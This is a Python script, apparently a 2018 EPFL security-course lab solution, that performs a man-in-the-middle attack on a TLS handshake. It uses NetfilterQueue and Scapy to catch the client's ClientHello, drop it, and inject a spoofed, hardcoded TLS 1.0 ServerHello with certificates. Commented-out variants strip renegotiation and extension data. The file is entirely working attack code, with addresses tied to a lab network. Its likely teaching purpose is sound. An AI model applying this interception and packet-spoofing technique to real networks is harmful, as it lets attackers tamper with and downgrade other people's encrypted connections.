# Lucia Montero Sanchis
# Information Security and Privacy, EPFL 2018
import netfilterqueue
from netfilterqueue import NetfilterQueue
from scapy.all import *
import json
import requests

# NF_ACCEPT: let the packet pass
# NF_DROP: drop the packet
# NF_STOLEN: take the packet and don't let it pass
# NF_QUEUE: queue the packet
# NF_REPEAT: call the hook again

indices = [0, 5, 9, 10]
c_hello_v2 = [22, 1, 3, 3]
#original = "16030100420200003e0301a7e0ab1cd5c7d42fc3ecf1c42add94ba3a2bd70eabfdbdfd9f5871e6533af7a700c030000016ff01000100000b00040300010200230000000f00010116030307e50b0007e10007de00037a308203763082025e020900d64b8de083177796300d06092a864886f70d01010b0500307b310b3009060355040613024348310b30090603550408130256443111300f060355040713084c617573616e6e65310d300b060355040a13044550464c310e300c060355040b13054445444953310f300d06035504031306636f6d343032311c301a06092a864886f70d010901160d6465646973406570666c2e6368301e170d3137303430343135303732335a170d3138303831373135303732335a307f310b3009060355040613024348310b30090603550408130256443111300f060355040713084c617573616e6e65310d300b060355040a13044550464c310e300c060355040b13054445444953310f300d06035504031306636f6d3430323120301e06092a864886f70d0109011611736572766572687733406570666c2e636830820122300d06092a864886f70d01010105000382010f003082010a02820101009ad591695e300eacb148870c1d35671261c3e189cde3b0fee1ae1e114db2a388ddeed0ada4f9127cbbc91bec574c75363f0cf007f18c5ba6df5b19f6cbc2658f85c4ef9706d7897d786c712b1aba6faba8b6df2e1e925197820bc66dc1320e86e58ab93cf2a350fc366b4a327001e06465a17310a42892ba1d0f9f7013492ef4461dd7d91998cc80beb76b702bab76058f2a100e320700f4a69767bd8fe7fd168465376f73a9f771527a2fcc052bee9919db80fdfe8a2b8b97f7a6039cd9d998ac6fde0bb454d3661c6ec1428d3e24ad77d65e1ac653357bd79bf7973926d1204c4c3e82cc75607de36c93cf3e92b8bac34b2442630c66989fd04535809cba590203010001300d06092a864886f70d01010b0500038201010037100245e843a2d67aa369b4dace990a3b9fe9b5fa295752548da40ff64d3dd106dae2a728a2a0f3ef3747fc392ffa4605b1e6d61caba2506be91da2002cc48a89652baece1852a652bab4965edb4831bdb602edf5909d7406c75997c21a0055d83c8c64280a7b6b6aef00673ce0fdb3df5727d95231b9b88a52312134caef9507b8bf2d7f6088dc28ab70a7f9bba1199ccef0c0851dd00fb4b2305f85d499fe09b58bdb7c9013cbf57e7b778f5048c3d244930882051298ff08518f636be56617bd10ef922850c3292b9b447037c2ff0735555d77e30118434485a41eeb5eac1e86e4cc21cd56e03034e9bc5db579b9d87bc713b89e1ce5b29fbbcaf198172a00045e3082045a30820342a0030201020209009512b16c0dd81d7d300d06092a864886f70d01010b0500307b310b3009060355040613024348310b30090603550408130256443111300f060355040713084c617573616e6e65310d300b060355040a13044550464c310e300c060355040b13054445444953310f300d06035504031306636f6d343032311c301a06092a864886f70d010901160d6465646973406570666c2e6368301e170d3137303430343134353932345a170d3230303132333134353932345a307b310b3009060355040613024348310b30090603550408130256443111300f060355040713084c617573616e6e65310d300b060355040a13044550464c310e300c060355040b13054445444953310f300d06035504031306636f6d343032311c301a06092a864886f70d010901160d6465646973406570666c2e636830820122300d06092a864886f70d01010105000382010f003082010a0282010100bace54261552e54b244ac8e3482cc699a6434b3afdb915938ac9cecb9921c4dc32bf7d"
#no_regen = "160301003d020000390301ea5c00aa6fbb47c17e8faa6039ffe7e708f05d2835724d986f8f80e5b246a17900c030000011000b00040300010200230000000f00010116030307e50b0007e10007de00037a308203763082025e020900d64b8de083177796300d06092a864886f70d01010b0500307b310b3009060355040613024348310b30090603550408130256443111300f060355040713084c617573616e6e65310d300b060355040a13044550464c310e300c060355040b13054445444953310f300d06035504031306636f6d343032311c301a06092a864886f70d010901160d6465646973406570666c2e6368301e170d3137303430343135303732335a170d3138303831373135303732335a307f310b3009060355040613024348310b30090603550408130256443111300f060355040713084c617573616e6e65310d300b060355040a13044550464c310e300c060355040b13054445444953310f300d06035504031306636f6d3430323120301e06092a864886f70d0109011611736572766572687733406570666c2e636830820122300d06092a864886f70d01010105000382010f003082010a02820101009ad591695e300eacb148870c1d35671261c3e189cde3b0fee1ae1e114db2a388ddeed0ada4f9127cbbc91bec574c75363f0cf007f18c5ba6df5b19f6cbc2658f85c4ef9706d7897d786c712b1aba6faba8b6df2e1e925197820bc66dc1320e86e58ab93cf2a350fc366b4a327001e06465a17310a42892ba1d0f9f7013492ef4461dd7d91998cc80beb76b702bab76058f2a100e320700f4a69767bd8fe7fd168465376f73a9f771527a2fcc052bee9919db80fdfe8a2b8b97f7a6039cd9d998ac6fde0bb454d3661c6ec1428d3e24ad77d65e1ac653357bd79bf7973926d1204c4c3e82cc75607de36c93cf3e92b8bac34b2442630c66989fd04535809cba590203010001300d06092a864886f70d01010b0500038201010037100245e843a2d67aa369b4dace990a3b9fe9b5fa295752548da40ff64d3dd106dae2a728a2a0f3ef3747fc392ffa4605b1e6d61caba2506be91da2002cc48a89652baece1852a652bab4965edb4831bdb602edf5909d7406c75997c21a0055d83c8c64280a7b6b6aef00673ce0fdb3df5727d95231b9b88a52312134caef9507b8bf2d7f6088dc28ab70a7f9bba1199ccef0c0851dd00fb4b2305f85d499fe09b58bdb7c9013cbf57e7b778f5048c3d244930882051298ff08518f636be56617bd10ef922850c3292b9b447037c2ff0735555d77e30118434485a41eeb5eac1e86e4cc21cd56e03034e9bc5db579b9d87bc713b89e1ce5b29fbbcaf198172a00045e3082045a30820342a0030201020209009512b16c0dd81d7d300d06092a864886f70d01010b0500307b310b3009060355040613024348310b30090603550408130256443111300f060355040713084c617573616e6e65310d300b060355040a13044550464c310e300c060355040b13054445444953310f300d06035504031306636f6d343032311c301a06092a864886f70d010901160d6465646973406570666c2e6368301e170d3137303430343134353932345a170d3230303132333134353932345a307b310b3009060355040613024348310b30090603550408130256443111300f060355040713084c617573616e6e65310d300b060355040a13044550464c310e300c060355040b13054445444953310f300d06035504031306636f6d343032311c301a06092a864886f70d010901160d6465646973406570666c2e636830820122300d06092a864886f70d01010105000382010f003082010a0282010100bace54261552e54b244ac8e3482cc699a6434b3afdb915938ac9cecb9921c4dc32bf7d"
#no_exten = "160301002c020000280301ea5c00aa6fbb47c17e8faa6039ffe7e708f05d2835724d986f8f80e5b246a17900c030000000"
a =        "160301003d020000390301ea5c00aa6fbb47c17e8faa6039ffe7e708f05d2835724d986f8f80e5b246a17900c030000011000b00040300010200230000000f00010116030307e50b0007e10007de00037a308203763082025e020900d64b8de083177796300d06092a864886f70d01010b0500307b310b3009060355040613024348310b30090603550408130256443111300f060355040713084c617573616e6e65310d300b060355040a13044550464c310e300c060355040b13054445444953310f300d06035504031306636f6d343032311c301a06092a864886f70d010901160d6465646973406570666c2e6368301e170d3137303430343135303732335a170d3138303831373135303732335a307f310b3009060355040613024348310b30090603550408130256443111300f060355040713084c617573616e6e65310d300b060355040a13044550464c310e300c060355040b13054445444953310f300d06035504031306636f6d3430323120301e06092a864886f70d0109011611736572766572687733406570666c2e636830820122300d06092a864886f70d01010105000382010f003082010a02820101009ad591695e300eacb148870c1d35671261c3e189cde3b0fee1ae1e114db2a388ddeed0ada4f9127cbbc91bec574c75363f0cf007f18c5ba6df5b19f6cbc2658f85c4ef9706d7897d786c712b1aba6faba8b6df2e1e925197820bc66dc1320e86e58ab93cf2a350fc366b4a327001e06465a17310a42892ba1d0f9f7013492ef4461dd7d91998cc80beb76b702bab76058f2a100e320700f4a69767bd8fe7fd168465376f73a9f771527a2fcc052bee9919db80fdfe8a2b8b97f7a6039cd9d998ac6fde0bb454d3661c6ec1428d3e24ad77d65e1ac653357bd79bf7973926d1204c4c3e82cc75607de36c93cf3e92b8bac34b2442630c66989fd04535809cba590203010001300d06092a864886f70d01010b0500038201010037100245e843a2d67aa369b4dace990a3b9fe9b5fa295752548da40ff64d3dd106dae2a728a2a0f3ef3747fc392ffa4605b1e6d61caba2506be91da2002cc48a89652baece1852a652bab4965edb4831bdb602edf5909d7406c75997c21a0055d83c8c64280a7b6b6aef00673ce0fdb3df5727d95231b9b88a52312134caef9507b8bf2d7f6088dc28ab70a7f9bba1199ccef0c0851dd00fb4b2305f85d499fe09b58bdb7c9013cbf57e7b778f5048c3d244930882051298ff08518f636be56617bd10ef922850c3292b9b447037c2ff0735555d77e30118434485a41eeb5eac1e86e4cc21cd56e03034e9bc5db579b9d87bc713b89e1ce5b29fbbcaf198172a00045e3082045a30820342a0030201020209009512b16c0dd81d7d300d06092a864886f70d01010b0500307b310b3009060355040613024348310b30090603550408130256443111300f060355040713084c617573616e6e65310d300b060355040a13044550464c310e300c060355040b13054445444953310f300d06035504031306636f6d343032311c301a06092a864886f70d010901160d6465646973406570666c2e6368301e170d3137303430343134353932345a170d3230303132333134353932345a307b310b3009060355040613024348310b30090603550408130256443111300f060355040713084c617573616e6e65310d300b060355040a13044550464c310e300c060355040b13054445444953310f300d06035504031306636f6d343032311c301a06092a864886f70d010901160d6465646973406570666c2e636830820122300d06092a864886f70d01010105000382010f003082010a0282010100bace54261552e54b244ac8e3482cc699a6434b3afdb915938ac9cecb9921c4dc32bf7d"
def callback(pkt):
    msg = IP(pkt.get_payload())
    #pkt.accept()
    if(msg.haslayer(TCP)):
        if len(msg[TCP].payload) > (2 + 4*11):
            info = [bytes(msg[TCP].payload)[i] for i in indices]
            if info == c_hello_v2:
                print(":D")
                ip_total_len = msg.len
                ip_header_len = msg.ihl * 32 / 8
                tcp_header_len = msg[TCP].dataofs * 32 / 8
                tot_len = int(ip_total_len - ip_header_len - tcp_header_len)
                dport = msg[TCP].sport
                sport = 443
                seq = msg[TCP].ack
                ack = msg[TCP].seq + tot_len
                print("dport:{}  sport:{}  seq:{}  ack:{}".format(dport, sport, seq, ack))
                pkt.drop()
                packet = (IP(dst="172.16.0.2", src="128.178.156.165") /
                    TCP(sport=sport, dport=dport, seq=seq, ack=ack, flags=0x10)
                     / bytes(bytearray.fromhex(a))
                    )
                send(packet)
            else:
                pkt.accept()
        else:
            pkt.accept()
    else:
        pkt.accept()

nfqueue = NetfilterQueue()
# To not overload the queue, specifying queue length
nfqueue.bind(0, callback, 100)
try:
    nfqueue.run()
except KeyboardInterrupt:
    print('')
nfqueue.unbind()